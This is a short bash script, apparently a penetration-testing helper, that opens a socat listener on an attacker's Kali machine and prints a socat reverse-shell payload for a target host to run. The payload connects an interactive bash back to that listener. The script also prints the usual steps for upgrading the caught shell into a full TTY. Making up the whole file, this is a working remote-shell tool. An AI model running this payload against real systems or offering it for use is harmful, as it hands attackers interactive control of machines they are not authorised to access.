#!/bin/bash

# === CONFIGURATION ===
LHOST="172.16.10.1"   # Change to your Kali IP
LPORT="1337"

# === PART 1: Start TTY Listener using socat ===
echo "[*] Starting socat listener on $LPORT..."
gnome-terminal -- bash -c "socat file:\$(tty),raw,echo=0 tcp-listen:$LPORT; exec bash" &

# Wait briefly to ensure listener is up
sleep 2

# === PART 2: Payload for Remote Execution ===
PAYLOAD="socat exec:'bash -li',pty,stderr tcp:$LHOST:$LPORT"

# Example usage (manual injection or SSH command):
echo "[*] Use this payload on the target:"
echo
echo "$PAYLOAD"
echo

# === ALTERNATIVE: Python TTY Upgrade ===
echo "[*] If already in a limited shell and Python is available, run:"
echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo

# === Optional: Pipe upgrade after reverse shell ===
echo "[*] Once shell is caught, upgrade with:"
echo "Ctrl-Z → 'stty raw -echo; fg' → 'export TERM=xterm'"
